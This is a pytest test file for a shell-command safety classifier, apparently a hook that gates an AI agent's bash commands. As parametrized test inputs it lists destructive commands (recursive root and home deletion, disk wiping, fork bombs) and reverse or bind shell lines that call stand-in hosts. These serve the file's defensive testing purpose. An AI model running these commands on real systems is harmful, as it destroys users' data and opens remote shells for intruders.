"""Static floor rule group 2: catastrophic actions, privilege wrappers, power, network shells."""


import pytest

from nuh import catastrophic, config, floor, hook, taxonomy
from nuh.bash import classify_command
from nuh.config import NuhConfig


def _floor(command: str) -> tuple[str, list[str]]:
    result = classify_command(command)
    return result.final_decision, result.floor_rules()


@pytest.fixture
def in_project(project_root, monkeypatch):
    monkeypatch.chdir(project_root)
    return project_root


class TestCatastrophicDelete:
    @pytest.mark.parametrize("command", [
        "rm -rf /",
        "rm -rf /*",
        "rm -rf --no-preserve-root /",
        "rm -rf ~",
        "rm -rf ~/",
        "rm -rf $HOME",
        "rm -rf ${HOME}",
        "rm -rf /home",
        "rm -rf /usr",
        "rm -rf /tmp",
        "rm -rf .git",
        "rm -rf .git/objects",
        "rm -rf .git/*",
        "rm -rf sub/.git",
        "rm -rf build /",
        "sudo rm -rf /",
        "bash -c 'rm -rf ~'",
        "echo $(rm -rf ~)",
    ])
    def test_block(self, in_project, command):
        assert _floor(command) == (taxonomy.BLOCK, ["catastrophic"])

    @pytest.mark.parametrize("command", ["rm -rf ~/*", "rm -rf /etc/*"])
    def test_block_through_a_glob(self, in_project, command):
        """The glob also reaches credential paths (~/.gnupg, /etc/shadow), so either block may name it."""
        decision, rules = _floor(command)
        assert decision == taxonomy.BLOCK and rules[0] in ("catastrophic", "credential_paths")
        assert any(verdict[0] == taxonomy.BLOCK and floor.rule_of(verdict) == "catastrophic"
                   for verdict in catastrophic.stage_verdicts(command.split(), taxonomy.FILESYSTEM_DELETE))

    @pytest.mark.parametrize("command", [
        "rm -rf .",
        "rm -rf ./*",
        "rm -rf *",
        "rm -f .git/index.lock",
        "rm -f .git/FETCH_HEAD",
        "rm -rf ..",
        'rm -rf "$UNSET_NUH_TEST_VAR/"',
        'rm -rf "$(pwd)/"',
        "rm -rf /tmp/*",
    ])
    def test_floored_ask(self, in_project, command):
        decision, rules = _floor(command)
        assert decision == taxonomy.ASK
        assert "catastrophic" in rules

    def test_absolute_project_path(self, in_project):
        assert _floor(f"rm -rf {in_project}") == (taxonomy.ASK, ["catastrophic"])

    @pytest.mark.parametrize("command", [
        "rm -rf build",
        "rm -rf ./build/*",
        'rm -rf "$UNSET_NUH_TEST_VAR"',
        'rm -rf "$UNSET_NUH_TEST_VAR/out"',
        "rm -rf /tmp/nuh-test-scratch",
        "find . -name '*.pyc' -delete",
    ])
    def test_ordinary_deletes_not_floored(self, in_project, command):
        assert "catastrophic" not in _floor(command)[1]

    def test_configured_trusted_root(self, in_project, tmp_path):
        trusted = tmp_path / "scratch"
        trusted.mkdir()
        config._cached_config = NuhConfig(trusted_paths=[str(trusted)])
        assert _floor(f"rm -rf {trusted}")[0] == taxonomy.BLOCK
        assert _floor(f"rm -rf {trusted}/old")[0] == taxonomy.ALLOW

    def test_find_root_asks_instead_of_blocking(self, in_project):
        assert _floor("find / -name '*.tmp' -delete") == (taxonomy.ASK, ["catastrophic"])

    def test_unfiltered_find_is_a_wipe(self, in_project):
        assert _floor("find . -delete") == (taxonomy.ASK, ["catastrophic"])
        assert _floor("find / -delete")[0] == taxonomy.BLOCK

    def test_overrides_user_delete_policy(self, in_project):
        config._cached_config = NuhConfig(actions={"filesystem_delete": "allow"})
        assert _floor("rm -rf /")[0] == taxonomy.BLOCK
        assert _floor("rm -rf .") == (taxonomy.ASK, ["catastrophic"])

    def test_floored_ask_never_reaches_llm(self, in_project, monkeypatch):
        config._cached_config = NuhConfig(llm={"enabled": True})
        monkeypatch.setattr(hook, "_try_llm", lambda r: pytest.fail("LLM called on a floored ask"))
        assert hook.handle_bash({"command": "rm -rf ."})["_floor"] == "catastrophic"


class TestPermissionsAndStorage:
    @pytest.mark.parametrize("command", [
        "chmod -R 777 /",
        "chown -R nobody ~",
        "chmod --recursive 700 /usr",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sdb1",
        "wipefs -a /dev/sdb",
        "sgdisk --zap-all /dev/nvme0n1",
        "zpool destroy tank",
        "echo x > /dev/sda",
        "echo c > /proc/sysrq-trigger",
        "cp image.iso /dev/sdb",
    ])
    def test_block(self, in_project, command):
        assert _floor(command) == (taxonomy.BLOCK, ["catastrophic"])

    def test_storage_block_overrides_policy(self, in_project):
        config._cached_config = NuhConfig(actions={"unknown": "allow", "filesystem_write": "allow"})
        assert _floor("mkfs.ext4 /dev/sdb1")[0] == taxonomy.BLOCK
        assert _floor("echo x > /dev/sda")[0] == taxonomy.BLOCK

    def test_chmod_of_trusted_root_itself_asks(self, in_project):
        assert _floor("chmod 777 /tmp") == (taxonomy.ASK, ["catastrophic"])

    @pytest.mark.parametrize("command", [
        "chmod -R 755 ./src",
        "chmod +x script.sh",
        "mkfs.ext4 --help",
        "wipefs -n -a /dev/sdb",
        "dd if=/dev/sda of=disk.img",
    ])
    def test_not_floored(self, in_project, command):
        assert "catastrophic" not in _floor(command)[1]


class TestForkBomb:
    @pytest.mark.parametrize("command", [
        ":(){ :|:& };:",
        "bomb() { bomb | bomb & }; bomb",
        "bash -c ':(){ :|:& };:'",
    ])
    def test_block(self, command):
        result = classify_command(command)
        assert result.final_decision == taxonomy.BLOCK
        assert "fork bomb" in result.reason
        assert "catastrophic" in result.floor_rules()

    def test_quoted_example_is_text(self):
        assert "fork bomb" not in classify_command("echo ':(){ :|:& };:'").reason

    def test_literal_heredoc_body_is_text(self):
        assert "fork bomb" not in classify_command("cat <<'EOF'\n:(){ :|:& };:\nEOF").reason


class TestPrivilege:
    @pytest.mark.parametrize("command", [
        "sudo apt update",
        "sudo -u bob ls",
        "sudo -i",
        "doas ls /root",
        "pkexec ls",
        "su -c 'ls'",
        "runuser -u bob -- ls",
        "sudoedit /etc/hosts",
    ])
    def test_floored_ask(self, in_project, command):
        decision, rules = _floor(command)
        assert decision == taxonomy.ASK
        assert "privilege" in rules

    def test_inner_block_kept(self, in_project):
        assert _floor("su -c 'rm -rf /'")[0] == taxonomy.BLOCK
        assert _floor("sudo -u root rm -rf ~")[0] == taxonomy.BLOCK


class TestPowerAndNetworkShells:
    @pytest.mark.parametrize("command,rule", [
        ("shutdown -h now", "power_service"),
        ("reboot", "power_service"),
        ("systemctl poweroff", "power_service"),
        ("systemctl --user stop foo.service", "power_service"),
        ("systemctl isolate rescue.target", "power_service"),
        ("service nginx stop", "power_service"),
        ("init 0", "power_service"),
        ("nc -e /bin/sh example.com 4444", "network_shell"),
        ("ncat --sh-exec 'sh' -l 4444", "network_shell"),
        ("socat tcp-listen:4444 exec:/bin/sh", "network_shell"),
        ("bash -i >& /dev/tcp/192.0.2.1/4444 0>&1", "network_shell"),
        ("exec 3<>/dev/tcp/192.0.2.1/80", "network_shell"),
    ])
    def test_floored_ask(self, in_project, command, rule):
        decision, rules = _floor(command)
        assert decision == taxonomy.ASK
        assert rule in rules

    @pytest.mark.parametrize("command", [
        "systemctl status docker",
        "systemctl --user restart foo.service",
        "nc -z example.com 80",
        "shutdown --help",
    ])
    def test_not_floored(self, in_project, command):
        rules = _floor(command)[1]
        assert "power_service" not in rules and "network_shell" not in rules
